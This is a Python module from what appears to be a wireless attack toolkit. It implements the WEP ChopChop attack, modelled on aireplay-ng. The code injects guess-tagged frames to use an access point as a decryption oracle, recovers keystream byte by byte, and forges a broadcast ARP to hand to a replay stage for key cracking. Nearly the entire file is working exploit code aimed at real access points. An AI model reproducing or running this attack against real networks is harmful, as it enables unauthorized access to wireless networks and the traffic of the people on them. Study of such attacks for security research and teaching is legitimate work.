"""WEP ChopChop attack (`aireplay-ng -4`) — M6.

Decrypts a captured frame byte-by-byte using the AP as an ICV oracle, no key:
chop the last byte, guess its plaintext (≤256), fix the ICV
(wep_crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to a data
frame from us, send. The AP relays the shortened frame IFF the guess was right.
Walk backwards recovering one keystream byte per accepted guess → enough
keystream to forge a broadcast ARP → hand to replay.

IDENTITY-BY-CONSTRUCTION (ported from aireplay-ng's do_attack_chopchop, the
ground truth): we do NOT infer which guess the AP accepted from "which frame we
sent" or "which relay came first" — that inference is what made sibling-BSS
echoes and multi-relay APs ambiguous. Instead, like aireplay, we **stamp the
guess value into the destination MAC** of every candidate (DA =
``FF:rr:rr:rr:rr:GUESS``, with a sentinel bit in byte 1), blast all 256 guesses
in a rolling stream, and **read the accepted guess straight back out of the
AP's relayed frame** (``guess = relay Addr1[5]``). The relay carries its own
identity, so guess order is irrelevant, duplicate echoes resolve to the same
byte, and a multi-relay AP can't confuse us. No DFS, no "first is truth."

The sentinel (guess 256) is a deliberately bad-ICV frame: if the AP relays it,
the AP doesn't discard invalid-ICV frames and chopchop can't work — we say so
rather than failing silently (aireplay-ng.c, the ``h80211[5] & 1`` check).

Keystream recovery (the offline-testable core): the keystream is fixed per IV,
so each accepted guess gives ks[i] = body[i] XOR guess, recovered end-inward.
The first 16 plaintext bytes of a broadcast ARP are known (LLC/SNAP +
ARP-request header), so we chop only the variable tail and fill ks[0..15] from
the known prefix — which also avoids chopping below the AP's drop-short wall.
If the wall leaves a 1-byte gap above the prefix, we recover it by brute-forcing
the keystream byte over 256 full-length forged ARPs (same tag-and-read-back).

Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
retrying). The campaign pauses replay before running this and resumes it on
success with the forged ARP.
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from typing import Awaitable, Callable, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.wep_crypto import (
    arp_request_plaintext,
    chop_last_byte_and_fixup,
    icv,
)

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6
# Known plaintext prefix of a broadcast ARP REQUEST: LLC/SNAP (6) + ethertype
# 0x0806 (2) + ARP htype/ptype/hlen/plen/op-request (8) = 16 bytes. ks[0..15] =
# cipher[0..15] XOR this, so we don't chop them (and don't shrink the frame to a
# too-short-to-relay size). Assumes the captured broadcast frame is an ARP
# request — true for broadcast ARP. (IP-packet seeds via header reconstruction
# are a planned follow-up.)
_KNOWN_ARP16 = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
])
# Sentinel "guess" — not a byte value (0..255), but a flag the oracle returns
# when the AP relayed a deliberately-bad-ICV frame (→ AP isn't vulnerable).
_SENTINEL = 256


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _hdr_len(fc0: int, fc1: int) -> int:
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:
        n += 2
    if fc1 & 0x80:
        n += 4
    return n


class WepChopChop:
    """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
    recover keystream → forge a broadcast ARP → hand to replay."""

    # Rolling-send spacing (aireplay sends one tagged guess per pps tick rather
    # than send-one-wait — much faster; the relay arrives async and is matched
    # by its MAC tag). ~3ms observed relay latency on hardware.
    _SEND_INTERVAL_S = 0.003
    # After a full 256-guess sweep, wait this long for trailing relays.
    _DRAIN_S = 0.05
    # A position with no relay across this many sweeps is the drop-short wall
    # (small gap → brute) or the AP gone quiet.
    _MAX_SWEEPS = 3
    _HEARTBEAT_S = 5.0
    # The AP stops relaying once frames get too short, so the last keystream
    # byte just above the known prefix can be unreachable by chopping. We
    # brute-force a gap this small with FULL-length forged frames (above the
    # wall): 1 byte = 256 tagged candidates, the valid one relays.
    _MAX_BRUTE_BYTES = 1

    def __init__(
        self,
        iface,
        target: AccessPoint,
        store,
        source_mac: bytes,
        on_forged_arp: Callable[[bytes], None],
        can_inject: Optional[Callable[[], bool]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        sender_ip: bytes = bytes([192, 168, 1, 123]),
        target_ip: bytes = bytes([192, 168, 1, 1]),
        oracle: Optional[Callable[[bytes], Awaitable[Optional[int]]]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.store = store
        self.source_mac = source_mac
        self._on_forged_arp = on_forged_arp
        self._can_inject = can_inject or (lambda: True)
        # Our guesses ARE activity — feed this so fake-auth's periodic keepalive
        # re-auth doesn't fire mid-chop (a long byte-walk would otherwise hit
        # the inactivity timer and re-auth in the middle of guessing).
        self._notify_activity = notify_activity or (lambda: None)
        self._log = log_callback or (lambda _m: None)
        self._sender_ip = sender_ip
        self._target_ip = target_ip
        # The oracle is injectable so the byte-walk is unit-testable offline:
        # oracle(body) -> the accepted guess for chopping body's last byte (or
        # _SENTINEL if the AP relays bad ICV, or None if no relay). Default =
        # the live AP (tag-and-read-back over USB).
        self._oracle = oracle or self._hw_oracle

        self.state = "idle"        # idle|waiting-auth|seeding|chopping|success
        self._active = False
        self._task: Optional[asyncio.Task] = None
        self._tried: set = set()   # seed IVs that stalled
        self._bytes_done = 0       # progress for the UI
        self._bytes_total = 0

        # Current chop target's IV + KeyID + cipher.
        self._cur_iv = b""
        self._cur_keyid = 0
        self._cur_cipher = b""
        # Per-position random MAC tag (DA = FF:tag[0..2]:GUESS, byte-1 LSB is the
        # sentinel flag). Regenerated each position so a stale relay from the
        # previous byte carries a DIFFERENT tag and is simply ignored.
        self._cur_tag = b"\x00\x00\x00\x00"
        # Set by the RX callback: the guess read out of the AP's relay (the MAC
        # tag), or "sentinel relayed" (AP doesn't drop bad ICV).
        self._relayed_guess: Optional[int] = None
        self._sentinel_relayed = False
        self._last_heartbeat = 0.0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._loop())
        logger.info("[WEP-Chop] Started on %s as %s",
                    self.bssid, self.source_mac.hex())

    def stop(self):
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info("[WEP-Chop] Stopped (%d bytes recovered).", self._bytes_done)

    @property
    def is_active(self) -> bool:
        return self._active

    # ---- Seed selection -----------------------------------------------------

    def _wep_body(self, captured: bytes):
        """(iv, keyid, cipher) from a captured broadcast WEP frame, or None."""
        if len(captured) < 28:
            return None
        body = captured[_hdr_len(captured[0], captured[1]):]
        if len(body) < 44:                 # need IV+KeyID + >=40B cipher (ARP)
            return None
        return body[:3], body[3], body[4:]

    def _pick_target(self):
        """Choose a not-yet-stalled captured broadcast ARP to chop."""
        for raw in reversed(self.store.arp_candidates(self.bssid)):
            parsed = self._wep_body(raw)
            if not parsed:
                continue
            iv, keyid, cipher = parsed
            if iv in self._tried:
                continue
            self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
            self._bytes_done = 0
            self._bytes_total = len(cipher) - len(_KNOWN_ARP16)
            self._log(
                f"[green]ChopChop:[/green] chopping IV {iv.hex()} "
                f"[dim]({len(cipher)}B cipher, {self._bytes_total} bytes to "
                f"recover)[/dim]"
            )
            return cipher
        return None

    # ---- The byte-walk: linear, identity read from each relay ---------------

    async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
        """Recover the keystream by chopping ``cipher`` down to the known ARP
        prefix — reading each accepted byte out of the AP's relay tag — then
        forge + return a broadcast ARP from the recovered keystream, or None.

        Linear (no DFS): the relay's MAC tag tells us exactly which guess the AP
        accepted, so there's no ambiguity to backtrack over."""
        nknown = len(_KNOWN_ARP16)
        if len(cipher) < nknown + 4:
            return None
        known_ks = bytes(cipher[i] ^ _KNOWN_ARP16[i] for i in range(nknown))
        full_len = len(cipher)
        body = bytes(cipher)
        ks_map: dict = {}                  # {position: recovered keystream byte}

        while self._active and len(body) > nknown:
            self._bytes_done = max(self._bytes_done, full_len - len(body))
            self._maybe_heartbeat()
            guess = await self._oracle(body)
            if guess == _SENTINEL:
                self._log(
                    "[red]ChopChop: AP relayed a bad-ICV frame[/red] [dim](it "
                    "doesn't discard invalid frames — not vulnerable to "
                    "chopchop in this mode)[/dim]"
                )
                return None
            if guess is None:
                # No relay: the drop-short wall (a small brute-forceable gap
                # remains just above the prefix) or the AP went quiet.
                gap = list(range(nknown, len(body)))
                if 0 < len(gap) <= self._MAX_BRUTE_BYTES:
                    return await self._build_and_forge(
                        ks_map, known_ks, full_len, gap
                    )
                return None
            pos = len(body) - 1
            ks_map[pos] = body[-1] ^ guess
            body = chop_last_byte_and_fixup(body, guess)

        if not self._active:
            return None
        return await self._build_and_forge(ks_map, known_ks, full_len, [])

    # ---- Live-AP oracle: tag the guess, read it back from the relay ---------

    def _tagged_da(self, guess: int) -> bytes:
        """Destination MAC carrying the guess (aireplay's trick): FF (multicast,
        so the AP floods the relay onto the air) : 3 random bytes (fixed for
        this position) : guess. Byte-1 LSB = "real guess" (0 for the sentinel),
        so we can tell a relayed bad-ICV sentinel from a real accepted byte."""
        b1 = (self._cur_tag[0] & 0xFE) | (0 if guess == _SENTINEL else 1)
        return bytes([0xFF, b1, self._cur_tag[1], self._cur_tag[2],
                      self._cur_tag[3], guess & 0xFF])

    def _forge_frame(self, body_cipher: bytes, da: bytes) -> bytes:
        """Re-header a (chopped/forged) cipher to a ToDS data frame from us with
        destination ``da``, reusing the chop target's IV + KeyID."""
        hdr = (b"\x08\x41" + b"\x00\x00"        # Data, ToDS=1, Protected=1
               + self.bssid_bytes + self.source_mac + da + b"\x00\x00")
        return hdr + self._cur_iv + bytes([self._cur_keyid]) + body_cipher

    async def _send_tagged(self, body_cipher: bytes, guess: int) -> None:
        frame = self._forge_frame(body_cipher, self._tagged_da(guess))
        try:
            await self.iface.send_raw(frame, use_no_ack=True)
        except Exception:
            logger.exception("[WEP-Chop] send_raw failed")
            return
        self._notify_activity()   # keep the assoc alive — no periodic re-auth

    async def _await_assoc(self) -> bool:
        """Don't burn guesses while de-associated (a reactive re-auth in
        flight); wait briefly for the association to come back."""
        waited = 0.0
        while self._active and not self._can_inject() and waited < 5.0:
            await asyncio.sleep(0.1)
            waited += 0.1
        return self._active and self._can_inject()

    async def _sweep_for_relay(self, candidate) -> Optional[int]:
        """Blast a rolling stream of guess-tagged frames and return the guess
        read back from the AP's relay (or _SENTINEL / None). ``candidate(guess)``
        builds the cipher to send for a given guess (so the same sweep serves
        both chopping and the wall-gap brute-force). A fresh MAC tag per call
        makes stale relays from the previous position fall on the floor."""
        self._cur_tag = bytes(random.randint(0, 255) for _ in range(4))
        self._relayed_guess = None
        self._sentinel_relayed = False
        for _sweep in range(self._MAX_SWEEPS):
            if not await self._await_assoc():
                return None
            # One sentinel per sweep: truncate without fixing the ICV → invalid.
            await self._send_tagged(candidate(_SENTINEL), _SENTINEL)
            for guess in range(256):
                if not self._active:
                    return None
                if self._sentinel_relayed:
                    return _SENTINEL
                if self._relayed_guess is not None:
                    return self._relayed_guess
                await self._send_tagged(candidate(guess), guess)
                await asyncio.sleep(self._SEND_INTERVAL_S)
            await asyncio.sleep(self._DRAIN_S)   # let trailing relays land
            if self._sentinel_relayed:
                return _SENTINEL
            if self._relayed_guess is not None:
                return self._relayed_guess
        return None

    async def _hw_oracle(self, body: bytes) -> Optional[int]:
        """Chop ``body``'s last byte against the live AP: the candidate for
        guess g is the chopped+ICV-fixed frame (the sentinel is the truncated
        frame WITHOUT the fixup → bad ICV)."""
        def candidate(guess: int) -> bytes:
            if guess == _SENTINEL:
                return body[:-1]                       # no fixup → invalid ICV
            return chop_last_byte_and_fixup(body, guess)
        return await self._sweep_for_relay(candidate)

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        """Read the accepted guess out of the AP's relay: a Data + FromDS +
        Protected frame whose Addr1 (RA) is the multicast tag we stamped. The
        guess is Addr1[5]; Addr1[1] LSB distinguishes a real byte from a relayed
        sentinel (bad-ICV) frame."""
        if not self._active or len(frame) < 22:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2 or not (fc1 & 0x40):    # data + Protected
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):                # FromDS, not ToDS
            return
        # Addr1 (RA) == our stamped tag: FF : (byte1&0xFE) : tag[1] : tag[2]
        if frame[4] != 0xFF:
            return
        if (frame[5] & 0xFE) != (self._cur_tag[0] & 0xFE):
            return
        if frame[6] != self._cur_tag[1] or frame[7] != self._cur_tag[2] \
                or frame[8] != self._cur_tag[3]:
            return
        if frame[16:22] != self.source_mac:                 # SA == us
            return
        if not (frame[5] & 0x01):       # sentinel relayed → AP keeps bad ICV
            self._sentinel_relayed = True
            return
        self._relayed_guess = frame[9]                      # the accepted guess

    # ---- Main loop ----------------------------------------------------------

    async def _loop(self) -> None:
        try:
            while self._active:
                if not self._can_inject():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.2)
                    continue
                cipher = self._pick_target()
                if not cipher:
                    self._set_state("seeding")
                    await asyncio.sleep(0.3)
                    self._maybe_heartbeat()
                    continue

                self._set_state("chopping")
                forged = await self._chop_and_forge(cipher)
                if not self._active:
                    return
                if forged is None:
                    # The wall left an un-brute-forceable gap, the AP went quiet,
                    # or it isn't vulnerable — blacklist this seed, try another.
                    # Keep retrying (never auto-stop), per the design.
                    self._log(
                        "[yellow]ChopChop: couldn't recover from this seed[/yellow] "
                        "[dim](trying another)[/dim]"
                    )
                    self._tried.add(self._cur_iv)
                    continue
                self._succeed(forged)
                return
        except asyncio.CancelledError:
            pass

    async def _build_and_forge(self, ks_map, known_ks, full_len, gap) -> Optional[bytes]:
        """Assemble the recovered keystream (chopped bytes + known prefix), forge
        a broadcast ARP, and return it. No AP round-trip needed: correct
        keystream → a valid frame by construction (replay will confirm IVs
        flow). A ``gap`` (the drop-short wall left a keystream byte unreachable)
        is recovered by brute-forcing that cipher byte over 256 tagged
        full-length forged ARPs. Returns the broadcast ARP, or None."""
        nknown = len(known_ks)
        ks = bytearray(full_len)
        for pos, val in ks_map.items():
            ks[pos] = val
        ks[:nknown] = known_ks

        plain = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        )
        full = plain + icv(plain)                          # 40 B known plaintext
        cipher = bytearray(p ^ ks[i] for i, p in enumerate(full))

        if gap:
            p = gap[0]                                     # _MAX_BRUTE_BYTES == 1
            self._log(
                "[green]ChopChop:[/green] [dim]drop-short wall hit — brute-"
                "forcing the last keystream byte (256 forged ARPs)…[/dim]"
            )

            def candidate(guess: int) -> bytes:
                if guess == _SENTINEL:
                    return bytes(cipher[:p]) + b"\x00" + bytes(cipher[p + 1:])
                c = bytearray(cipher)
                c[p] = guess
                return bytes(c)
            accepted = await self._sweep_for_relay(candidate)
            if accepted is None or accepted == _SENTINEL:
                return None
            cipher[p] = accepted

        return self._forge_frame(bytes(cipher), _BROADCAST)

    def _succeed(self, forged: bytes) -> None:
        self._set_state("success")
        self._log(
            "[green]✓ ChopChop recovered keystream[/green] [dim](forged a "
            "broadcast ARP — handing to replay)[/dim]"
        )
        # Immediate handoff (mirrors frag): stop, hand the forged ARP over.
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        try:
            self._on_forged_arp(forged)
        except Exception:
            logger.exception("[WEP-Chop] on_forged_arp callback failed")

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        self.state = state

    def _maybe_heartbeat(self) -> None:
        now = time.time()
        if now - self._last_heartbeat < self._HEARTBEAT_S:
            return
        self._last_heartbeat = now
        if self.state == "chopping":
            self._log(
                f"[green]ChopChop:[/green] [dim]byte {self._bytes_done}/"
                f"{self._bytes_total} recovered…[/dim]"
            )
